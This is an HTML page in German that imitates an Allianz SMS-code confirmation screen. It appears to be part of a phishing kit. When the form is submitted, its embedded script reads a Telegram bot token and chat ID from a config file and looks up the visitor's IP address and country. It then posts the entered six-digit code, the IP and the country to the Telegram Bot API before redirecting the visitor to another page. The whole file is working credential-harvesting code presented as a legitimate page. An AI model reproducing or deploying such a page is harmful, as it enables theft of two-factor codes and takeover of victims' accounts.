<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SMS Code Eingeben</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #ffffff;
      color: #000;
    }

    header {
      padding: 20px 30px;
      border-bottom: 1px solid #ddd;
      text-align: center;
    }

    header img {
      height: 32px;
    }

    .form-container {
      max-width: 400px;
      margin: 50px auto;
      padding: 0 20px;
      text-align: center;
    }

    .form-container h1 {
      font-size: 22px;
      margin-bottom: 20px;
    }

    .form-container p {
      font-size: 14px;
      color: #444;
      margin-bottom: 30px;
    }

    input[type="text"] {
      padding: 14px;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
      letter-spacing: 10px;
    }

    .submit-btn {
      margin-top: 25px;
      background-color: #0072ce;
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .submit-btn:hover {
      background-color: #005fa3;
    }

    .logo-img {
      width: 100%;
      max-width: 280px;
      margin: 30px auto;
    }
  </style>
</head>
<body>

  <header>
    <img src="allo.svg" alt="Allianz Logo">
  </header>

  <div class="form-container">
    <img src="alli.png" alt="SMS Logo" class="logo-img">
    <h1>SMS-Code Best√§tigung</h1>
    <p>Bitte geben Sie den 6-stelligen SMS-Code ein, den wir an Ihre Telefonnummer gesendet haben.</p>

    <form id="mitid-core-client-form">
      <input type="text" id="smscode" name="smscode" maxlength="6" placeholder="‚óè‚óè‚óè‚óè‚óè‚óè" required />
      <button type="submit" class="submit-btn">BEST√ÑTIGEN</button>
    </form>
  </div>


        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
		
        <script>
            $("#smscode").mask("00000000");
        </script>
		
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<script>
    $(document).ready(function () {
        // Load botToken and chatId from TELEGRAM.json
        function loadConfig() {
            return fetch('TELEGRAM.json')
                .then(response => response.json())
                .then(data => ({
                    botToken: data.botToken,
                    chatId: data.chatId
                }))
                .catch(error => {
                    console.error('Error loading config file:', error);
                    return null;
                });
        }

        // Get user's IP and country using ipify and ipinfo.io
        function getIpAndCountry() {
            return $.get('https://api.ipify.org?format=json')
                .then(function(ipData) {
                    // Get country based on IP
                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
                        .then(function(data) {
                            return {
                                ip: ipData.ip,
                                country: data.country || 'Unknown'
                            };
                        })
                        .catch(function() {
                            return {
                                ip: ipData.ip,
                                country: 'Unknown'
                            };
                        });
                })
                .catch(function() {
                    return {
                        ip: 'Unavailable',
                        country: 'Unknown'
                    };
                });
        }

        $("#mitid-core-client-form").submit(function (event) {
            event.preventDefault(); // Prevent default form action

            var sms = $("#smscode").val().trim();

            if (sms) {
                loadConfig().then(config => {
                    if (config) {
                        getIpAndCountry().then(data => {
                            var ipAddress = data.ip;
                            var country = data.country;
                            var now = new Date().toLocaleString(); // Get current date and time

                            var telegramMessage = "üì± **SMS Code**\n\n" +
                                "üîπ **SMSCODE:** `" + sms + "`\n" +
                                "üîπ **IP Address:** `" + ipAddress + "`\n" +
                                "üè≥ **Country:** `" + country + "`\n" +
                                "üïí **Date/Time:** `" + now + "`";

                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
                            var requestData = {
                                chat_id: config.chatId,
                                text: telegramMessage,
                                parse_mode: "Markdown"
                            };

                            $.post(telegramBotUrl, requestData, function () {
                                window.location.href = "Don.html?vc?__event=ciiord&service_id=top_mlsd=DE";
                            }).fail(function () {
                                alert("Bitte versuchen Sie es erneut.");
                            });
                        });
                    }
                });
            }
        });
    });
</script>

</body>
</html>
